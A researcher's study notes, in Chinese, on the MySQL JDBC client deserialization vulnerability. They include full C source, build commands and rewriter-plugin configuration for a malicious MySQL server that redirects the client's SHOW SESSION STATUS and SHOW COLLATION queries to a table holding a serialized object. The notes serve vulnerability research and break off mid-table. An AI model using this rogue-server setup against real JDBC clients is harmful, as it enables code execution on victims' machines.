**作者：沈沉舟**  
**原文链接：**
## 背景介绍
2019年11月底Yang Zhang等人在BlackHat上有个议题，提到MySQL JDBC客户端反序列
化漏洞，用到ServerStatusDiffInterceptor，参[1]。
2019年12月Welkin给出了部分细节，但当时未解决恶意服务端的组建问题，参[2]。
codeplutos利用修改过的MySQL插件成功组建恶意服务端，这个脑洞开得可以。与此
同时，他演示了另一条利用路径，用到detectCustomCollations。需要指出，他的方
案原理同时适用于ServerStatusDiffInterceptor、detectCustomCollations，他只 以后者举例而已。参[3]。
2020年4月fnmsd分析MySQL Connector/J各版本后给出大一统的总结，给出不同版本
所需URL，给了Python版恶意服务端，参[4]、[5]、[6]。
2020年5月我学习前几位的大作，写了这篇笔记。
## 学习思路
先将[1]、[2]、[3]、[4]、[5]、[6]全看了一遍，没做实验，只是看。对这个洞大概有点数，通
过JDBC建立到MySQL服务端的连接时，有几个内置的SQL查询语句被发出，其中两个查
询的结果集在客户端被处理时会调用ObjectInputStream.readObject()进行反序列化。
通过控制结果集，可以在客户端搞事，具体危害视客户端拥有的Gadget环境而定。
这两个查询语句是:
  * SHOW SESSION STATUS
  * SHOW COLLATION
利用MySQL插件机制将这两个查询语句在服务端"重定向"成查询恶意表，恶意表中某 字段存放恶意Object。
需要安装MySQL，创建恶意表，编译定制过的恶意MySQL插件。写一个通用的JDBC客户
端程序，用之访问恶意服务端。用Wireshark抓包，基于抓包数据用Python实现简版 恶意服务端，这样可以避免陷入MySQL私有协议细节当中。
## 搭建测试环境
参看[《恶意MySQL Server读取MySQL
Client端文件》](http://scz.617.cn/network/202001101612.txt "《恶意MySQL Server读取MySQL
Client端文件》")
## 恶意MySQL插件
### 获取MySQL 5.7.28源码
链接如下所示：
### 在rewrite_example基础上修改出evilreplace
    $ vi evilreplace.cc
    /  Copyright (c) 2015, Oracle and/or its affiliates. All rights reserved.
        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License, version 2.0,
        as published by the Free Software Foundation.
        This program is also distributed with certain software (including
        but not limited to OpenSSL) that is licensed under separate terms,
        as designated in a particular file or component or in included license
        documentation.  The authors of MySQL hereby grant you an additional
        permission to link the program and your derivative works with the
        separately licensed software that they have included with MySQL.
        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License, version 2.0, for more details.
        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
        02110-1301  USA */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include  // my_thread_handle needed by mysql_memory.h
    #include 
    /* instrument the memory allocation */
    #ifdef HAVE_PSI_INTERFACE
    static PSI_memory_key key_memory_evilreplace;
    static PSI_memory_info all_rewrite_memory[]=
    {
      { &key_memory_evilreplace, "evilreplace", 0 }
    };
    static int plugin_init(MYSQL_PLUGIN)
    {
      const char* category= "sql";
      int count;
      count= array_elements(all_rewrite_memory);
      mysql_memory_register(category, all_rewrite_memory, count);
      return 0; /* success */
    }
    #else
    #define plugin_init NULL
    #define key_memory_evilreplace PSI_NOT_INSTRUMENTED
    #endif /* HAVE_PSI_INTERFACE */
    static int rewrite_lower(MYSQL_THD thd, mysql_event_class_t event_class,
                             const void *event)
    {
      if (event_class == MYSQL_AUDIT_PARSE_CLASS)
      {
        const struct mysql_event_parse *event_parse=
          static_cast(event);
        if (event_parse->event_subclass == MYSQL_AUDIT_PARSE_PREPARSE)
        {
    #if 0
          size_t query_length= event_parse->query.length;
          char *rewritten_query=
            static_cast(my_malloc(key_memory_evilreplace,
                                           query_length + 1, MYF(0)));
          for (unsigned i= 0; i query.str[i]);
          event_parse->rewritten_query->str= rewritten_query;
          event_parse->rewritten_query->length= query_length;
          *((int *)event_parse->flags)|=
                            (int)MYSQL_AUDIT_PARSE_REWRITE_PLUGIN_QUERY_REWRITTEN;
    #else
            if
            (
                ( strcmp( event_parse->query.str, "SHOW SESSION STATUS" ) == 0 )
                ||
                ( strcmp( event_parse->query.str, "SHOW COLLATION" ) == 0 )
            )
            {
                char    evilsql[]       = "select evil_1,evil_2,evil_3 from evildb.eviltable limit 1;";
                char   *rewritten_query = static_cast
                (
                    my_malloc
                    (
                        key_memory_evilreplace,
                        strlen( evilsql ) + 1,
                        MYF(0)
                    )
                );
                strcpy( rewritten_query, evilsql );
                event_parse->rewritten_query->str       = rewritten_query;
                event_parse->rewritten_query->length    = strlen( evilsql ) + 1;
                *((int *)event_parse->flags)           |= (int)MYSQL_AUDIT_PARSE_REWRITE_PLUGIN_QUERY_REWRITTEN;
            }
    #endif
        }
      }
      return 0;
    }
    /* Audit plugin descriptor */
    static struct st_mysql_audit evilreplace_descriptor=
    {
      MYSQL_AUDIT_INTERFACE_VERSION,                    /* interface version */
      NULL,                                             /* release_thd()     */
      rewrite_lower,                                    /* event_notify()    */
      { 0,
        0,
        (unsigned long) MYSQL_AUDIT_PARSE_ALL, }        /* class mask        */
    };
    /* Plugin descriptor */
    mysql_declare_plugin(audit_log)
    {
      MYSQL_AUDIT_PLUGIN,             /* plugin type                   */
      &evilreplace_descriptor,    /* type specific descriptor      */
      "evilreplace",              /* plugin name                   */
      "Oracle",                       /* author                        */
      "An example of a query rewrite"
      " plugin that rewrites all queries"
      " to lower case",               /* description                   */
      PLUGIN_LICENSE_GPL,             /* license                       */
      plugin_init,                    /* plugin initializer            */
      NULL,                           /* plugin deinitializer          */
      0x0002,                         /* version                       */
      NULL,                           /* status variables              */
      NULL,                           /* system variables              */
      NULL,                           /* reserverd                     */
      0                               /* flags                         */
    }
    mysql_declare_plugin_end;
参考[3]，codeplutos介绍了Ubuntu 16.04下的MySQL插件编译方案。各发行版的编译过 程差别较大，RedHat
7.6上明显不同，建议先搞清楚如何编译MySQL源码，再来编译 单个插件。
编译:
    /usr/bin/c++ -DHAVE_CONFIG_H -DHAVE_LIBEVENT2 -DMYSQL_DYNAMIC_PLUGIN -D_FILE_OFFSET_BITS=64 \
    -D_GNU_SOURCE -Devilreplace_EXPORTS -Wall -Wextra -Wformat-security -Wvla -Woverloaded-virtual \
    -Wno-unused-parameter -O3 -g -fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing -DDBUG_OFF -fPIC \
    -I//mysql-5.7.28/include \
    -I//mysql-5.7.28/extra/rapidjson/include \
    -I//mysql-5.7.28/libbinlogevents/include \
    -I//mysql-5.7.28/libbinlogevents/export \
    -isystem //mysql-5.7.28/zlib \
    -I//mysql-5.7.28/sql \
    -I//mysql-5.7.28/sql/auth \
    -I//mysql-5.7.28/regex \
    -o evilreplace.cc.o \
    -c evilreplace.cc
链接:
    /usr/bin/c++ -fPIC -Wall -Wextra -Wformat-security -Wvla -Woverloaded-virtual -Wno-unused-parameter \
    -O3 -g -fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing -DDBUG_OFF \
    -fPIC -shared -Wl,-soname,evilreplace.so -o evilreplace.so \
    evilreplace.cc.o -lpthread \
    //libmysqlservices.a -lpthread
## 测试rewriter插件
rewriter.so是自带的插件，不需要源码编译。
### 安装rewriter.so
查看:`/usr/share/mysql/install_rewriter.sql`
除了安装rewriter.so，还涉及辅助表和存储过程的创建。
mysql> source /usr/share/mysql/install_rewriter.sql
这会多出query_rewrite库、query_rewrite.rewrite_rules表。
mysql> show plugins;
Name | Status | Type | Library | License  
---|---|---|---|---  
Rewriter | ACTIVE | AUDIT | rewriter.so | GPL  
mysql> SHOW GLOBAL VARIABLES LIKE 'rewriter_enabled';
Variable_name | Value  
---|---  
rewriter_enabled | ON  
### 在服务端替换SQL查询语句
向`query_rewrite.rewrite_rules`表中插入替换规则:
mysql> insert into query_rewrite.rewrite_rules(pattern, replacement)
values('select line from sczdb.SczTable', 'select line from sczdb.scztable
limit 1');
调用存储过程刷新，使之热生效:
mysql> call query_rewrite.flush_rewrite_rules();
测试替换规则:
mysql> select line from sczdb.SczTable;
### 卸载rewriter.so
mysql> source /usr/share/mysql/uninstall_rewriter.sql
只有退出当前客户端才彻底卸载rewriter插件，否则其仍在生效中。
### rewriter插件的局限性
清空表，二选一，推荐后者:
  * delete from query_rewrite.rewrite_rules;
  * truncate table query_rewrite.rewrite_rules;
mysql> insert into query_rewrite.rewrite_rules(pattern, replacement)
values('SHOW SESSION STATUS', 'select * from evildb.eviltable');
mysql> select * from query_rewrite.rewrite_rules;
id | pattern | pattern_database | replacement | enabled | message |
pattern_digest | normalized_pattern  